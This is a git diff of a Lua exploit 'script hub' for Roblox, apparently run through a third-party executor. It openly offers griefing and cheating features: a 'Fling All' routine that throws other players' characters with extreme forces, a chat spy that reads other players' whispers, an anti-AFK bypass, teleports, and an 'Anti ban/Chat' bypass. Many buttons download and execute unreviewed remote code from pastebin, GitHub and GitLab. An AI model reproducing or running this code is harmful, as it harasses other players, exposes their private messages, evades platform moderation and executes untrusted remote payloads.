-local plr = game.Players.LocalPlayer
-plr.Character.Animate:ClearAllChildren()
-for i,v in pairs(game.Players[TargetV].Character.Animate:GetChildren()) do
-   v:Clone().Parent = plr.Character.Animate
-end
 	end)
-
-TargetT:Button(
-	"Copy Targets Username",
-	function()
-		setclipboard(game:GetService("Players")[TargetV].Name)
-	end
-)
-
-TargetT:Button(
-    "Fling all",
-    function()
-    local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
-
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-
-local AllBool = false
-
-local GetPlayer = function(Name)
-    Name = Name:lower()
-    if Name == "all" or Name == "others" then
-        AllBool = true
-        return
-    elseif Name == "random" then
-        local GetPlayers = Players:GetPlayers()
-        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
-        return GetPlayers[math.random(#GetPlayers)]
-    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
-        for _,x in next, Players:GetPlayers() do
-            if x ~= Player then
-                if x.Name:lower():match("^"..Name) then
-                    return x;
-                elseif x.DisplayName:lower():match("^"..Name) then
-                    return x;
-                end
-            end
+-----------------------------------------------
+--Duping Tab
+------------------------------------------------
+TabDU:Button("Anti AFK",function()
+wait(0) local A_1 = "[ShizzuruHub] Anti Afk Activate" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+    local virtualUser = game:GetService('VirtualUser')
+    virtualUser:CaptureController()
+    spawn(function()
+        while true do
+            wait()
+            virtualUser:SetKeyDown('0x1f')
+            wait(2)
+            virtualUser:SetKeyUp('0x1f')
+            wait()
         end
-    else
-        return
-    end
-end
-
-local Message = function(_Title, _Text, Time)
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
-end
-
-local SkidFling = function(TargetPlayer)
-    local Character = Player.Character
-    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
-    local RootPart = Humanoid and Humanoid.RootPart
-
-    local TCharacter = TargetPlayer.Character
-    local THumanoid
-    local TRootPart
-    local THead
-    local Accessory
-    local Handle
-
-    if TCharacter:FindFirstChildOfClass("Humanoid") then
-        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
-    end
-    if THumanoid and THumanoid.RootPart then
-        TRootPart = THumanoid.RootPart
-    end
-    if TCharacter:FindFirstChild("Head") then
-        THead = TCharacter.Head
-    end
-    if TCharacter:FindFirstChildOfClass("Accessory") then
-        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
-    end
-    if Accessoy and Accessory:FindFirstChild("Handle") then
-        Handle = Accessory.Handle
-    end
-
-    if Character and Humanoid and RootPart then
-        if RootPart.Velocity.Magnitude < 50 then
-            getgenv().OldPos = RootPart.CFrame
-        end
-        if THumanoid and THumanoid.Sit and not AllBool then
-            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
-        end
-        if THead then
-            workspace.CurrentCamera.CameraSubject = THead
-        elseif not THead and Handle then
-            workspace.CurrentCamera.CameraSubject = Handle
-        elseif THumanoid and TRootPart then
-            workspace.CurrentCamera.CameraSubject = THumanoid
-        end
-        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
-            return
-        end
-        
-        local FPos = function(BasePart, Pos, Ang)
-            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
-            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
-            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
-            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
-        end
-        
-        local SFBasePart = function(BasePart)
-            local TimeToWait = 2
-            local Time = tick()
-            local Angle = 0
-
-            repeat
-                if RootPart and THumanoid then
-                    if BasePart.Velocity.Magnitude < 50 then
-                        Angle = Angle + 100
-
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
-                        task.wait()
-                    else
-                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-                        
-                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
-                        task.wait()
-
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
-                        task.wait()
-                    end
-                else
-                    break
-                end
-            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
-        end
-        
-        workspace.FallenPartsDestroyHeight = 0/0
-        
-        local BV = Instance.new("BodyVelocity")
-        BV.Name = "EpixVel"
-        BV.Parent = RootPart
-        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
-        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
-        
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-        
-        if TRootPart and THead then
-            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
-                SFBasePart(THead)
-            else
-                SFBasePart(TRootPart)
-            end
-        elseif TRootPart and not THead then
-            SFBasePart(TRootPart)
-        elseif not TRootPart and THead then
-            SFBasePart(THead)
-        elseif not TRootPart and not THead and Accessory and Handle then
-            SFBasePart(Handle)
-        else
-            return Message("Error Occurred", "Target is missing everything", 5)
-        end
-        
-        BV:Destroy()
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-        workspace.CurrentCamera.CameraSubject = Humanoid
-        
-        repeat
-            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
-            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
-            Humanoid:ChangeState("GettingUp")
-            table.foreach(Character:GetChildren(), function(_, x)
-                if x:IsA("BasePart") then
-                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
-                end
-            end)
-            task.wait()
-        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
-        workspace.FallenPartsDestroyHeight = getgenv().FPDH
-    else
-        return Message("Error Occurred", "Random error", 5)
-    end
-end
-
-if not Welcome then Message("Script by ggxlui", "enjoy!", 5) end
-getgenv().Welcome = true
-if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
-
-if AllBool then
-    for _,x in next, Players:GetPlayers() do
-        SkidFling(x)
-    end
-end
-
-for _,x in next, Targets do
-    if GetPlayer(x) and GetPlayer(x) ~= Player then
-        if GetPlayer(x).UserId ~= 1414978355 then
-            local TPlayer = GetPlayer(x)
-            if TPlayer then
-                SkidFling(TPlayer)
-            end
-        else
-            Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
-        end
-    elseif not GetPlayer(x) and not AllBool then
-        Message("Error Occurred", "Username Invalid", 5)
-    end
-end
+    end)
+    spawn(function()
+        game.StarterGui:SetCore('SendNotification', {
+            Title = 'Anti Afk',
+            Text = 'Status: ON',
+        })
+    end)
 end)
-
-local Teleports = serv:Channel("Teleports")
-Teleports:Button(
-	"Sign",
-	function()
-	local player = game.Players.LocalPlayer
-    player.Character.HumanoidRootPart.CFrame = CFrame.new(-6.0386, 39.826, -202.427)
-    end)
-
-Teleports:Button(
-    "Center",
-    function()
-    local player = game.Players.LocalPlayer
-        player.Character.HumanoidRootPart.CFrame = CFrame.new(-6.068, 20.5, -228.049)
-        end)
-
-Teleports:Button(
-    "Minefield",
-    function()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-62, 23, -153)
-	end
-)
-
-Teleports:Button(
-    "Balloon",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-118, 23, -126)
-	end
-)
-
-Teleports:Button(
-    "Normal Stairs",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6, 203, -504)
-	end
-)
-
-Teleports:Button(
-    "Moving Stairs",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-213, 87, -224)
-	end
-)
-
-Teleports:Button(
-    "Spiral Stairs",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108, 829, -339)
-	end
-)
-
-Teleports:Button(
-    "Skyscraper",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(139, 1033, -191)
-	end
-)
-
-Teleports:Button(
-    "Cannon 1",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-62, 30, -227)
-	end
-)
-
-Teleports:Button(
-    "Cannon 2",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51, 30, -227)
-	end
-)
-
-Teleports:Button(
-    "Cannon 3",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7, 30, -106)
-	end
-)
-
-Teleports:Button(
-    "Pool",
-    function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-133, 65, -322)
-	end
-)
-
-local Misc = serv:Channel("Misc")
-
-
-Misc:Label("Player")
-
-Misc:Button(
-    "Fly mobile",
-    function()
-    loadstring(game:HttpGet('https://pastebin.com/raw/rXsDSAs1'))()
-    end)
-
-FLYSPEED = 5
-Misc:Button(
-    "Fly [X]",
-    function()
-		getgenv().FLYMODE = "Default"
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/fly.lua"))()
-	end
-)
-
-Misc:Button(
-    "Chat Spy",
-    function()
+TabDU:Button("Chat Spy",function(state)
     --[[
 Title = <string> - The title of the notification.
 Content = <string> - The content of the notification.
@@ -1053,7 +819,7 @@ public = false
 publicItalics = true
 --customize private logs
 privateProperties = {
-    Color = Color3.fromRGB(253, 174, 255); 
+    Color = Color3.fromRGB(207, 0, 119); 
     Font = Enum.Font.RobotoMono;
     TextSize = 17;
 }
@@ -1086,7 +852,7 @@ local function onChatted(p,msg)
                 if public then
                     saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.DisplayName .."]: "..msg,"All")
                 else
-                    privateProperties.Text = "{Ex} [".. p.DisplayName .."]: "..msg
+                    privateProperties.Text = "{sz} [".. p.DisplayName .."]: "..msg
                     StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
                 end
             end
@@ -1106,320 +872,667 @@ local chatFrame = player.PlayerGui.Chat.Frame
 chatFrame.ChatChannelParentFrame.Visible = true
 chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
 end)
+TabDU:Button("Fe Flips[z,x,c]",function(state)  
+    -- Copy from where it says wait(5) this is not my script so I will not take script credits
+      
+     -- Discord server coming soon
+      
+     wait(5)
+      
+     --[[ Info ]]--
+      
+     local ver = "2.00"
+     local scriptname = "feFlip"
+      
+      
+     --[[ Keybinds ]]--
+      
+     local FrontflipKey = Enum.KeyCode.Z
+     local BackflipKey = Enum.KeyCode.X
+     local AirjumpKey = Enum.KeyCode.C
+      
+      
+     --[[ Dependencies ]]--
+      
+     local ca = game:GetService("ContextActionService")
+     local zeezy = game:GetService("Players").LocalPlayer
+     local h = 0.0174533
+     local antigrav
+      
+      
+     --[[ Functions ]]--
+      
+     function zeezyFrontflip(act,inp,obj)
+         if inp == Enum.UserInputState.Begin then
+             zeezy.Character.Humanoid:ChangeState("Jumping")
+             wait()
+             zeezy.Character.Humanoid.Sit = true
+             for i = 1,360 do 
+                 delay(i/720,function()
+                 zeezy.Character.Humanoid.Sit = true
+                     zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
+                 end)
+             end
+             wait(0.55)
+             zeezy.Character.Humanoid.Sit = false
+         end
+     end
+      
+     function zeezyBackflip(act,inp,obj)
+         if inp == Enum.UserInputState.Begin then
+             zeezy.Character.Humanoid:ChangeState("Jumping")
+             wait()
+             zeezy.Character.Humanoid.Sit = true
+             for i = 1,360 do
+                 delay(i/720,function()
+                 zeezy.Character.Humanoid.Sit = true
+                     zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
+                 end)
+             end
+             wait(0.55)
+             zeezy.Character.Humanoid.Sit = false
+         end
+     end
+      
+     function zeezyAirjump(act,inp,obj)
+         if inp == Enum.UserInputState.Begin then
+             zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
+             wait()
+             zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
+         end
+     end
+      
+      
+     --[[ Binds ]]--
+      
+     ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
+     ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
+     ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)
+     end)
 
-Misc:Button(
-    "System Alert",
-    function()
-        for i=1,3 do 
-		 if game:GetService("TextChatService"):FindFirstChild("TextChannels") then
-			game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("\0")
-			else
-	   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
-			end
-	 end
+TabDU:Button("Victim Menu",function(state)
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/ggshizuru/myScriptHub/main/Victim.Menu.Sz.lua"))()
+     end)
+TabDU:Button("Fling All",function(state)
+wait(0) local A_1 = "[ShizzuruHub] Fling All Activate" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+    local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
+
+    local Players = game:GetService("Players")
+    local Player = Players.LocalPlayer
+    
+    local AllBool = false
+    
+    local GetPlayer = function(Name)
+        Name = Name:lower()
+        if Name == "all" or Name == "others" then
+            AllBool = true
+            return
+        elseif Name == "random" then
+            local GetPlayers = Players:GetPlayers()
+            if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+            return GetPlayers[math.random(#GetPlayers)]
+        elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+            for _,x in next, Players:GetPlayers() do
+                if x ~= Player then
+                    if x.Name:lower():match("^"..Name) then
+                        return x;
+                    elseif x.DisplayName:lower():match("^"..Name) then
+                        return x;
+                    end
+                end
+            end
+        else
+            return
+        end
+    end
+    
+    local Message = function(_Title, _Text, Time)
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
+    end
+    
+    local SkidFling = function(TargetPlayer)
+        local Character = Player.Character
+        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+        local RootPart = Humanoid and Humanoid.RootPart
+    
+        local TCharacter = TargetPlayer.Character
+        local THumanoid
+        local TRootPart
+        local THead
+        local Accessory
+        local Handle
+    
+        if TCharacter:FindFirstChildOfClass("Humanoid") then
+            THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+        end
+        if THumanoid and THumanoid.RootPart then
+            TRootPart = THumanoid.RootPart
+        end
+        if TCharacter:FindFirstChild("Head") then
+            THead = TCharacter.Head
+        end
+        if TCharacter:FindFirstChildOfClass("Accessory") then
+            Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+        end
+        if Accessoy and Accessory:FindFirstChild("Handle") then
+            Handle = Accessory.Handle
+        end
+    
+        if Character and Humanoid and RootPart then
+            if RootPart.Velocity.Magnitude < 50 then
+                getgenv().OldPos = RootPart.CFrame
+            end
+            if THumanoid and THumanoid.Sit and not AllBool then
+                return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
+            end
+            if THead then
+                workspace.CurrentCamera.CameraSubject = THead
+            elseif not THead and Handle then
+                workspace.CurrentCamera.CameraSubject = Handle
+            elseif THumanoid and TRootPart then
+                workspace.CurrentCamera.CameraSubject = THumanoid
+            end
+            if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+                return
+            end
+            
+            local FPos = function(BasePart, Pos, Ang)
+                RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+                Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+                RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+                RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+            end
+            
+            local SFBasePart = function(BasePart)
+                local TimeToWait = 2
+                local Time = tick()
+                local Angle = 0
+    
+                repeat
+                    if RootPart and THumanoid then
+                        if BasePart.Velocity.Magnitude < 50 then
+                            Angle = Angle + 100
+    
+                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                            task.wait()
+                        else
+                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+                            
+                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                            task.wait()
+    
+                            FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                            task.wait()
+                        end
+                    else
+                        break
+                    end
+                until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+            end
+            
+            workspace.FallenPartsDestroyHeight = 0/0
+            
+            local BV = Instance.new("BodyVelocity")
+            BV.Name = "EpixVel"
+            BV.Parent = RootPart
+            BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+            BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+            
+            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+            
+            if TRootPart and THead then
+                if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                    SFBasePart(THead)
+                else
+                    SFBasePart(TRootPart)
+                end
+            elseif TRootPart and not THead then
+                SFBasePart(TRootPart)
+            elseif not TRootPart and THead then
+                SFBasePart(THead)
+            elseif not TRootPart and not THead and Accessory and Handle then
+                SFBasePart(Handle)
+            else
+                return Message("Error Occurred", "Target is missing everything", 5)
+            end
+            
+            BV:Destroy()
+            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+            workspace.CurrentCamera.CameraSubject = Humanoid
+            
+            repeat
+                RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+                Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+                Humanoid:ChangeState("GettingUp")
+                table.foreach(Character:GetChildren(), function(_, x)
+                    if x:IsA("BasePart") then
+                        x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                    end
+                end)
+                task.wait()
+            until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+            workspace.FallenPartsDestroyHeight = getgenv().FPDH
+        else
+            return Message("Error Occurred", "Random error", 5)
+        end
+    end
+    
+    getgenv().Welcome = true
+    if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+    
+    if AllBool then
+        for _,x in next, Players:GetPlayers() do
+            SkidFling(x)
+        end
+    end
+    
+    for _,x in next, Targets do
+        if GetPlayer(x) and GetPlayer(x) ~= Player then
+            if GetPlayer(x).UserId ~= 1414978355 then
+                local TPlayer = GetPlayer(x)
+                if TPlayer then
+                    SkidFling(TPlayer)
+                end
+            else
+                Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
+            end
+        elseif not GetPlayer(x) and not AllBool then
+            Message("Error Occurred", "Username Invalid", 5)
+        end
+    end
+end)
+------------------------------------------------
+--Selling Tab
+------------------------------------------------
+TabS:Button("Super Happy Face",function()
+    local L_415_ = game.Players.LocalPlayer.Character
+    local L_416_ = L_415_:WaitForChild("Head")
+    local L_417_ = L_416_:WaitForChild("face")
+    L_417_.Texture = "rbxassetid://494290547"
     end)
+TabS:Button("Madness",function()
+    local L_415_ = game.Players.LocalPlayer.Character
+    local L_416_ = L_415_:WaitForChild("Head")
+    local L_417_ = L_416_:WaitForChild("face")
+    L_417_.Texture = "rbxassetid://129900258"
+    end)
+TabS:Button("Beast Mode",function()
+    local L_412_ = game.Players.LocalPlayer.Character
+    local L_413_ = L_412_:WaitForChild("Head")
+    local L_414_ = L_413_:WaitForChild("face")
+    L_414_.Texture = "rbxassetid://127959433"
+    end)
+TabS:Button("Meanie",function()
+   local L_415_ = game.Players.LocalPlayer.Character
+    local L_416_ = L_415_:WaitForChild("Head")
+    local L_417_ = L_416_:WaitForChild("face")
+    L_417_.Texture = "rbxassetid://508490451"
+    end)
+TabS:Button("Playful Vampire",function()
+    local L_415_ = game.Players.LocalPlayer.Character
+    local L_416_ = L_415_:WaitForChild("Head")
+    local L_417_ = L_416_:WaitForChild("face")
+    L_417_.Texture = "rbxassetid://2409281591"
+    end)
+TabS:Button("Headless",function()
+    game.Players.LocalPlayer.Character.Head.Transparency = 1
+    game.Players.LocalPlayer.Character.Head.face:Remove()
+end)
+TabS:Button("Korblox",function()
+    local ply = game.Players.LocalPlayer
+		local chr = ply.Character
+		chr.RightLowerLeg.MeshId = "902942093"
+		chr.RightLowerLeg.Transparency = "1"
+		chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+		chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+		chr.RightFoot.MeshId = "902942089"
+		chr.RightFoot.Transparency = "1"
+	end)
+TabS:Button("Fly[Mobile]",function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/rXsDSAs1'))()
+end)
+TabS:Button("Sit-Player",function()
+    game.Players.LocalPlayer.Character.Humanoid.Sit = true
+    end)
+    TabS:Button("Lay-Player",function()
+        local Human = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid
+          if not Human then
+              return
+          end
+          Human.Sit = true
+          task.wait(.1)
+          Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
+          for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+              v:Stop()
+          end
+          end)
+TabS:Button("Fe R6",function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/MJDVaiA5'))()
+    end)
+TabS:Button("Fe Ball[only PC]",function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/fun/ball.lua", true))()
+    end)
+TabDU:Button("Animations Player",function(state)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ggshizuru/myScriptHub/main/Shizu%20Animation%20lua"))()
+    end)
+TabDU:Button("Tp Tool",function(state)
+    loadstring(game:HttpGet('https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/tools/tp.lua'))()
+        local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.30
+        notifSound.SoundId = "rbxassetid://5568992074"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+    end)
+TabDU:Button("Unlock Zoom",function(state)
+    
+    game.Players.LocalPlayer.CameraMaxZoomDistance = (999999999999999)
+ end)
+TabDU:Button("Anti ban/Chat",function(state)
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/bypass%20chat.lua"))()
+    end)
+--Teleport Tab
+----------------------------------------------------------------
+TabT:Button("Save Position",function()
+    _G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+end)
+TabT:Button("Load Position",function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
+end)
+TabT:Button("Bunker",function()
+    local player = game.Players.LocalPlayer
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(143.932, 22.5, -217.049)
+    end)
+TabT:Button("Center",function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-6.068, 20.5, -228.049)
+        end)
+TabT:Button("Minifield",function()
+    local player = game.Players.LocalPlayer
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(-62.068, 20.5, -112.049)
+    end)
+TabT:Button("Moving Stairs",function()
+    local player = game.Players.LocalPlayer
+     player.Character.HumanoidRootPart.CFrame = CFrame.new(-215.068, 84.499, -224.049)
+     end)
+TabT:Button("Spiral Stairs",function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(151.932, 844.501, -300.049)
+    end)
+TabT:Button("Stairs",function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-6.068, 200.499, -512.049)
+        end)
+TabT:Button("Big building",function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(140.932, 1030.698, -191.049)
+    end)
+TabT:Button("Pool",function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-133.068, 62.5, -316.049)
+        end)
+TabT:Button("Ballon",function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-118, 20.696, -134)
+        end)
+TabT:Button("Cannon[1]",function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-62, 30, -227)
+    end)
+TabT:Button("Cannon[2]",function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51, 30, -227)
+     end)
+TabT:Button("Cannon[3]",function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7, 30, -106)
+    end)
